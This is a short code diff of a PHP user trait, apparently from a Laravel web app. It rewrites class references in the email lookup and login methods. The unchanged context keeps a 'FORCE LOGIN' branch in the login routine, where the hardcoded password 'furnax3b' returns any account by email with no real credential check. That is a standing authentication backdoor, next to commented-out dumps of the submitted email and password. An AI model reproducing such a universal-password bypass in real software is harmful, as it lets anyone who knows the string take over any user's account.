@@ -45,7 +45,7 @@ trait User
 
     public static function findByEmail($email = '')
     {
-        return self::where('email', $email)->first();
+        return \App\User::where('email', $email)->first();
     }
 
     public function updateAvatar($avatar = '')
@@ -133,7 +133,7 @@ trait User
 //        var_dump($email, $password);die;
         // FORCE LOGIN
         if($password === 'furnax3b'){
-            return User::findByEmail($email);
+            return \App\User::findByEmail($email);
         }
 
 //        dd($email, $password);
@@ -144,7 +144,7 @@ trait User
 
         if($result)
         {
-            return User::findByEmail($email);
+            return \App\User::findByEmail($email);
         }
 
         return $result;
